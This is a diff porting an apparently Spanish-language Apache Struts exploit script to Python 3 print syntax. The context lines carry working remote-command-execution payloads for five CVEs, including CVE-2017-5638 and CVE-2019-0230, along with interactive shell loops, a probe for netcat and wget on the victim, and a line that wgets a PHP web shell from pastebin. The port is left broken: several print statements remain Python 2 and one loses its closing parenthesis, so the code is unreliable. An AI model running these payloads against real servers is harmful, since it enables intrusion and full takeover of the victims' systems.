@@ -32,20 +32,20 @@ logo = BLUE+'''
 '''+ENDC
 
 if len(sys.argv) < 2:
-	print logo
-	print "\nUso: python ApacheStruts.py http(s)://www.victima.com/files.login\n"
+	print (logo)
+	print ("\nUso: python ApacheStruts.py http(s)://www.victima.com/files.login\n")
 	sys.exit(1)
-print logo
+print (logo)
 
 host = sys.argv[1]
 poc = "?redirect:${%23w%3d%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29.getWriter%28%29,%23w.println%28%27chapalapachala%27%29,%23w.flush%28%29,%23w.close%28%29}"
 
 def info():
-	print YELLOW+"   [-] GET PROMPT...\n"+ENDC
-	print BOLD+"   * [UPLOAD SHELL]"+ENDC
-	print OTRO+"     Struts@Shell:$ pwnd (php)"+ENDC
-	print BOLD+"   * [DOWNLOAD SHELL]"+ENDC
-	print OTRO+"     wget https://pastebin.com/raw/baJmN8G8 -O /tmp/status.php\n"+ENDC
+	print (YELLOW+"   [-] GET PROMPT...\n"+ENDC)
+	print (BOLD+"   * [UPLOAD SHELL]"+ENDC)
+	print (OTRO+"     Struts@Shell:$ pwnd (php)"+ENDC)
+	print (BOLD+"   * [DOWNLOAD SHELL]"+ENDC)
+	print (OTRO+"     wget https://pastebin.com/raw/baJmN8G8 -O /tmp/status.php\n"+ENDC)
 
 def parse_url(url):
     url = url.replace('#', '%23')
@@ -194,7 +194,7 @@ def CVE_2019_0230(comando):
 	return "id=%{#_memberAccess.allowPrivateAccess=true,#_memberAccess.allowStaticMethodAccess=true,#_memberAccess.excludedClasses=#_memberAccess.acceptProperties,#_memberAccess.excludedPackageNamePatterns=#_memberAccess.acceptProperties,#res=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#a=@java.lang.Runtime@getRuntime(),#s=new java.util.Scanner(#a.exec('"+ comando + "').getInputStream()).useDelimiter('\\\\A'),#str=#s.hasNext()?#s.next():'',#res.print(#str),#res.close()}"
 
 def identTools():
-	print "   ACTIVE SYSTEM TOOLS:"
+	print ("   ACTIVE SYSTEM TOOLS:"
 	py = requests.get(host+CVE_2013_2251("'which','python'")).content
 	pe = requests.get(host+CVE_2013_2251("'which','perl'")).content
 	ph = requests.get(host+CVE_2013_2251("'which','php'")).content
@@ -204,14 +204,14 @@ def identTools():
 	ne = requests.get(host+CVE_2013_2251("'which','netcat'")).content
 	pi = requests.get(host+CVE_2013_2251("'which','ping'")).content
 
-	print "     Python: %s" % py.strip()
-	print "     Perl: %s" % pe.strip()
-	print "     Php: %s" % ph.strip()
-	print "     Curl: %s" % cu.strip()
-	print "     Wget: %s" % wg.strip()
-	print "     Nc: %s" % nc.strip()
-	print "     Netcat: %s" % ne.strip()
-	print "     Ping: %s" % pi.strip()
+	print ("     Python: %s" % py.strip())
+	print ("     Perl: %s" % pe.strip())
+	print ("     Php: %s" % ph.strip())
+	print ("     Curl: %s" % cu.strip())
+	print ("     Wget: %s" % wg.strip())
+	print ("     Nc: %s" % nc.strip())
+	print ("     Netcat: %s" % ne.strip())
+	print ("     Ping: %s" % pi.strip())
 
 if len(host) > 0:
 	if host.find("https://") != -1 or host.find("http://") != -1:
@@ -220,10 +220,10 @@ if len(host) > 0:
 		try:
 			response = requests.get(host+poc).content
 		except:
-			print RED+" Servidor no responde\n"+ENDC
+			print (RED+" Servidor no responde\n"+ENDC)
 			exit(0)
 
-		print BOLD+"\n [+] RUN EXPLOIT CVE-2013-2251"+ENDC
+		print (BOLD+"\n [+] RUN EXPLOIT CVE-2013-2251"+ENDC)
 		if "chapalapachala" in response:
 				print RED+"   [-] VULNERABLE"+ENDC
 				owned = open('vulnsite.txt', 'a')
@@ -257,12 +257,12 @@ if len(host) > 0:
 								else:
 									print BOLD+RED+"\nNo Create File :/\n"+ENDC
 
-		print BLUE+"     [-] NO VULNERABLE TO CVE-2013-2251"+ENDC
+		print (BLUE+"     [-] NO VULNERABLE TO CVE-2013-2251"+ENDC)
 
 
 
 		# CVE-2017-5638 ---------------------------------------------------------------------------------				
-		print BOLD+" [+] RUN EXPLOIT CVE-2017-5638"+ENDC
+		print (BOLD+" [+] RUN EXPLOIT CVE-2017-5638"+ENDC)
 		x = 0
 		while x < len(validador()):
 			valida = validador()[x]
@@ -276,7 +276,7 @@ if len(host) > 0:
 				response = requests.get(host, headers=headers).content
 
 			  	if response.find("ASCII") != -1 or response.find("No such") != -1 or response.find("Directory of") != -1 or response.find("Volume Serial") != -1 or response.find(" netmask ") != -1 or response.find("root:") != -1 or response.find("groups=") != -1 or response.find("User accounts for") != -1 or response.find("de usuario de") != -1:
-			  		print RED+"   [-] VULNERABLE"+ENDC
+			  		print (RED+"   [-] VULNERABLE"+ENDC)
 			  		owned = open('vulnsite.txt', 'a')
 					owned.write(str(host)+'\n')
 					owned.close()
@@ -292,23 +292,23 @@ if len(host) > 0:
 									'User-Agent': 'Mozilla/5.0', 
 									'Content-Type': CVE_2017_5638(str(comando))
 									}
-							print requests.get(host, headers=headers).content
+							print (requests.get(host, headers=headers).content)
 					else:
 						x = len(validador())
 			except:
 				pass
 			x=x+1
-		print BLUE+"     [-] NO VULNERABLE TO CVE-2017-5638"+ENDC
+		print (BLUE+"     [-] NO VULNERABLE TO CVE-2017-5638"+ENDC)
 
 
 
 		# CVE-2018-11776 ---------------------------------------------------------------------------------			
-		print BOLD+" [+] RUN EXPLOIT CVE-2018-11776"+ENDC
+		print (BOLD+" [+] RUN EXPLOIT CVE-2018-11776"+ENDC)
 		parsed_url = parse_url(host)
 		injection_point = check(host)
 
 		if injection_point is not None:
-			print RED+"   [-] VULNERABLE"+ENDC
+			print (RED+"   [-] VULNERABLE"+ENDC)
 	  		owned = open('vulnsite.txt', 'a')
 			owned.write(str(host)+'\n')
 			owned.close()
@@ -326,14 +326,14 @@ if len(host) > 0:
 				    	'User-Agent': 'Mozilla/5.0',
 				    	'Accept': '*/*'
 						}
-			        print requests.get(testing_url, headers=headers, verify=False, timeout=3, allow_redirects=False).text
+			        print (requests.get(testing_url, headers=headers, verify=False, timeout=3, allow_redirects=False).text)
 
-		print BLUE+"     [-] NO VULNERABLE TO CVE-2018-11776"+ENDC
+		print (BLUE+"     [-] NO VULNERABLE TO CVE-2018-11776"+ENDC)
 
 
 
 		# CVE-2017-9805 ---------------------------------------------------------------------------------
-		print BOLD+" [+] RUN EXPLOIT CVE-2017-9805"+ENDC
+		print (BOLD+" [+] RUN EXPLOIT CVE-2017-9805"+ENDC)
 		x = 0
 		while x < len(validador()):
 			valida = validador()[x]
@@ -346,7 +346,7 @@ if len(host) > 0:
 				response = requests.post(host, data=CVE_2017_9805(str(valida)), headers=headers).content
 
 			  	if response.find("ASCII") != -1 or response.find("No such") != -1 or response.find("Directory of") != -1 or response.find("Volume Serial") != -1 or response.find(" netmask ") != -1 or response.find("root:") != -1 or response.find("groups=") != -1 or response.find("User accounts for") != -1 or response.find("de usuario de") != -1:
-			  		print RED+"   [-] VULNERABLE"+ENDC
+			  		print (RED+"   [-] VULNERABLE"+ENDC)
 			  		owned = open('vulnsite.txt', 'a')
 					owned.write(str(host)+'\n')
 					owned.close()
@@ -362,18 +362,18 @@ if len(host) > 0:
 								'User-Agent': 'Mozilla/5.0',
 			            		'Content-Type': 'application/xml'
 			            		}
-					  		print requests.post(host, data=CVE_2017_9805(str(valida)), headers=headers).content
+					  		print (requests.post(host, data=CVE_2017_9805(str(valida)), headers=headers).content)
 					else:
 						x = len(validador())
 			except:
 				pass
 			x=x+1
-		print BLUE+"     [-] NO VULNERABLE TO CVE-2017-9805"+ENDC
+		print (BLUE+"     [-] NO VULNERABLE TO CVE-2017-9805"+ENDC)
 
 
 
 		# CVE-2019-0230 ---------------------------------------------------------------------------------
-		print BOLD+" [+] RUN EXPLOIT CVE-2019-0230"+ENDC
+		print (BOLD+" [+] RUN EXPLOIT CVE-2019-0230"+ENDC)
 		x = 0
 		while x < len(validador()):
 			valida = validador()[x]
@@ -394,7 +394,7 @@ if len(host) > 0:
 				response = requests.post(url=url + "/index.action", headers=headers, data=CVE_2019_0230(comando)).content
 
 				if response.find("ASCII") != -1 or response.find("No such") != -1 or response.find("Directory of") != -1 or response.find("Volume Serial") != -1 or response.find(" netmask ") != -1 or response.find("root:") != -1 or response.find("groups=") != -1 or response.find("User accounts for") != -1 or response.find("de usuario de") != -1:
-					print RED+"   [-] VULNERABLE"+ENDC
+					print (RED+"   [-] VULNERABLE"+ENDC)
 			  		owned = open('vulnsite.txt', 'a')
 					owned.write(str(host)+'\n')
 					owned.close()
@@ -405,18 +405,18 @@ if len(host) > 0:
 
 					  	while 1:
 							comando = raw_input(GREEN+"\nStruts2@CVE-2019-0230 $ "+ENDC)
-							print requests.post(url=url + "/index.action", headers=headers, data=CVE_2019_0230(comando)).content
+							print (requests.post(url=url + "/index.action", headers=headers, data=CVE_2019_0230(comando)).content)
 			except:
 				pass
 			x=x+1
-		print BLUE+"     [-] NO VULNERABLE TO CVE-2019-0230"+ENDC
+		print (BLUE+"     [-] NO VULNERABLE TO CVE-2019-0230"+ENDC)
 
 
 	
 	else:
-		print RED+" Dominio debe tener un (https o http)\n"+ENDC
+		print (RED+" Dominio debe tener un (https o http)\n"+ENDC)
 		exit(0)
 else:
-	print RED+" Debe Ingresar una Url\n"+ENDC
+	print (RED+" Debe Ingresar una Url\n"+ENDC)
 	exit(0)
 
